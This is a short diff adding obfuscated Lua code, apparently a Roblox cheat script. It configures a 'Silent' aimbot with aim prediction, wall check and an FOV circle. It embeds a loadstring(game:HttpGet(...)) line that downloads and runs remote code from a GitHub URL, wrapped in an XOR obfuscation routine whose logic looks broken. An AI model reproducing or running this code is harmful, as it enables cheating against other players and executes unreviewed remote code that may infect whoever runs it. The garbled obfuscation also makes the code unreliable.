@@ -1,0 +1,5 @@
+loadstring(function()local function a(b)local c={}local d={}local e={}for f=1,#b do local g=string.sub(b,f,f)local h=string.byte(g)local i=(f-1)%5+1;h=h~string.byte("Roblox",i)c[f]=string.char(h)d[f]=h e[i]=(e[i]or 0)+h end;return table.concat(c),d,e end
+local j='getgenv().Silent={Settings={Enabled=true,AimPart="UpperTorso",Prediction=0.14263,WallCheck=true,Visualize=true,AutoPrediction=true,},FOV={Enabled=true,Size=23,Filled=false,Thickness=1,Transparency=0.85,Color=Color3.fromRGB(255,0,0),},}loadstring(game:HttpGet("https://raw.githubusercontent.com/CyberPlaysYT/Aura-x-update/main/Aura%20x%20updated",true))()'
+local k,b,l=a(j)
+for m,n in ipairs(l)do for o,p in ipairs(b)do l[m]=l[m]~p end end
+local q=string.char(table.unpack(l))return q end)()()
